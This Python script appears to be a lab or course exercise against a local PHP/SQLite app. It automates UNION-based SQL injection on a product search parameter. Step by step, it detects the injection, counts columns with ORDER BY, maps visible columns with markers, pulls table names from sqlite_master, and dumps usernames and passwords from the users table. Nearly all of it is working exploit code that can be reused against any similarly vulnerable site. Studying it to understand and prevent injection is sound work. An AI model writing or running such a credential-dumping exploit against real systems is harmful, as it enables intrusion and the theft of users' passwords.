import requests
from bs4 import BeautifulSoup
import time
import re

BASE_URL = "http://localhost/CyberProject" 
sid = "82reb4vqs953kqhnm8ull3r0am" # CHEAT - replace with a valid session ID obtained from a successful login or the SQLi bypass

#CHEAT - how do we know we need to use the products page?
# In reality, an attacker would discover this through normal site reconnaissance
# (browsing the app as a user, looking for inputs that hit the database).

def dump_users(target_url="http://localhost/CyberProject/products.php", session_id=sid):

    def print_step(title, payload, explanation):
        print(f"\n\033[1;34m[STEP]: {title}\033[0m")
        print(f"\033[1;32m[PAYLOAD]:\033[0m {payload}")
        print(f"\033[1;33m[EXPLANATION]:\033[0m {explanation}")
        print("-" * 60)
        time.sleep(0.5)

    def check_for_error(html):
        return "SQL Error" in html or "Fatal error" in html or "exception" in html.lower()

    # Step 1: check if SQLi exists
    print_step("Sanity Check", "%'", "Sending a single quote to break the query syntax.")
    cookies = {'PHPSESSID': session_id} if session_id else {}
    found_creds = []
    res = requests.get(target_url, params={'q': "%'"}, cookies=cookies)

    if check_for_error(res.text):
        print("[!] Success! The server returned an SQL error.")
    else:
        print("[-] No error returned. Check if the Session ID is valid and the site is running.")


    
    # Step 2: determine how much columns there are in the original query (SELECT)
    detected_cols = 0
    print_step("Enumeration - Column Count", "%' ORDER BY X --", "Incrementing ORDER BY until the page breaks.")

    for i in range(1, 10):
        payload = f"%' ORDER BY {i} --"
        res = requests.get(target_url, params={'q': payload}, cookies=cookies)
        
        if check_for_error(res.text):
            detected_cols = i - 1
            print(f"[!] Error at ORDER BY {i}. Conclusion: The table has {detected_cols} columns.")
            break
        else:
            print(f"[*] Column {i} exists...")

    # probably will never get there but just in case
    if detected_cols == 0:
        print("[-] Failed to detect column count. Defaulting to 5.")
        detected_cols = 5



    # Step 3: find which columns we see in the browser (meaning, in the HTML)
    visible_indices = []
    column_selectors = {}  # index -> (tag_name, class_name) of the cell containing that marker
    card_selector = None   # (tag_name, class_name) of the wrapper around one row

    print_step("Mapping Visible Columns", "UNION SELECT markers...", "Injecting markers and recording the HTML element each lands in.")

    # [0, 1, 2, 3]
    # ['COL_1', 'COL_2', 'COL_3', 'COL_4']
    markers = [f"COL_{i+1}" for i in range(detected_cols)]
    # ["'COL_1'", "'COL_2'", "'COL_3'", "'COL_4'"]
    # markers_str = "'COL_1', 'COL_2', 'COL_3', 'COL_4'"
    markers_str = ", ".join([f"'{m}'" for m in markers])
    # ZZZ%' UNION SELECT 'COL_1', 'COL_2', 'COL_3', 'COL_4'
    payload_map = f"ZZZ%' UNION SELECT {markers_str} --"

    res = requests.get(target_url, params={'q': payload_map}, cookies=cookies)
    # parses the HTML returned by the server into a navigable tree using BeautifulSoup
    soup = BeautifulSoup(res.text, 'html.parser')

    marker_elements = {}  # index -> the bs4 element holding the marker text
    for i, marker in enumerate(markers):
        text_node = soup.find(string=lambda s: s and marker in s)
        if not text_node:
            continue
        cell = text_node.parent
        cell_classes = cell.get('class') or []
        cell_class = cell_classes[0] if cell_classes else None
        visible_indices.append(i)
        marker_elements[i] = cell
        column_selectors[i] = (cell.name, cell_class)
        print(f"[+] Column {i+1} is VISIBLE in <{cell.name} class='{cell_class or ''}'>")

    # Find the smallest ancestor (with a class) that wraps ALL visible markers.
    # That's the per-row container we'll iterate over in Step 5.
    if marker_elements:
        first_cell = next(iter(marker_elements.values()))
        for ancestor in first_cell.parents:
            anc_classes = ancestor.get('class') or []
            if not anc_classes:
                continue
            if all((ancestor is cell) or (ancestor in cell.parents) for cell in marker_elements.values()):
                card_selector = (ancestor.name, anc_classes[0])
                print(f"[+] Row wrapper detected: <{ancestor.name} class='{anc_classes[0]}'>")
                break

    if not visible_indices:
        visible_indices = [1, 2]
        print("[-] No visible columns detected in text. Using defaults.")

    
    # Step 4: find table's names
    union_cols = ["NULL"] * detected_cols
    # don't leave null so the page will not skip rendering.
    union_cols[0] = "rowid" 
    # decide which column to inject the table names into (preferably a visible one)
    name_slot = visible_indices[0] if len(visible_indices) > 0 else 1
    # Put the actual extraction expression into that visible slot.
    #name is the column from sqlite_master holding each table's name.
    # printf('!!!%s!!!', name) wraps the value in !!!...!!! sentinels so later you can pull them back out of the noisy HTML
    union_cols[name_slot] = "printf('!!!%s!!!', name)"

    columns_str = ", ".join(union_cols)
    payload_tables = f"ZZZ%' UNION SELECT {columns_str} FROM sqlite_master WHERE type='table' --"

    print_step("Extracting Table Names", payload_tables, "Isolating names with printf.")
    res = requests.get(target_url, params={'q': payload_tables}, cookies=cookies)

    tables = re.findall(r'!!!(.*?)!!!', res.text)
    # because !!!%s!!! will be part of the HTMl
    tables = list(set([t for t in tables if t != "%s"]))

    print(f"\033[1;36m[+] Tables found in DB: {', '.join(tables)}\033[0m")

    
    # Step 5: Dump Users and Passwords (article-card version, with ID fix)
    if 'users' in tables:
        target_cols = ["NULL"] * detected_cols
        target_cols[0] = "id" 
        
        name_slot = visible_indices[0] if len(visible_indices) > 0 else 1
        pass_slot = visible_indices[1] if len(visible_indices) > 1 else name_slot
        
        target_cols[name_slot] = "username"
        target_cols[pass_slot] = "password"

        target_str = ", ".join(target_cols)
        payload_users = f"ZZZ%' UNION SELECT {target_str} FROM users --"
        
        print_step("Data Dump", payload_users, "Reusing the selectors discovered during column mapping.")
        res = requests.get(target_url, params={'q': payload_users}, cookies=cookies)
        soup = BeautifulSoup(res.text, 'html.parser')

        # Use the row wrapper and cell selectors we recorded in Step 3.
        if card_selector and name_slot in column_selectors and pass_slot in column_selectors:
            row_tag, row_class = card_selector
            user_cell_tag, user_cell_class = column_selectors[name_slot]
            pass_cell_tag, pass_cell_class = column_selectors[pass_slot]
            rows = soup.find_all(row_tag, class_=row_class)
        else:
            print("[-] Missing selectors from recon step; cannot extract rows.")
            rows = []

        print("\n\033[1;41;37m[!!!] BREACH RESULTS:\033[0m")

        for row in rows:
            user_cell = row.find(user_cell_tag, class_=user_cell_class)
            pass_cell = row.find(pass_cell_tag, class_=pass_cell_class)

            if user_cell and pass_cell:
                # Strip any decorative text the template appended around the value
                # (e.g. currency symbols, units). The attacker doesn't care what it is.
                u = re.sub(r'[^\w@.\-]', '', user_cell.get_text(strip=True))
                p = re.sub(r'[^\w@.\-]', '', pass_cell.get_text(strip=True))

                if u and u != "NULL":
                    print(f"[*] User: {u:<15} | Password: {p}")
                    found_creds.append((u, p))

    else:
        print("[-] 'users' table not found.")
    
    print("\n--- Script Finished ---")
    return found_creds

if __name__ == "__main__":
    results = dump_users()
    print(results)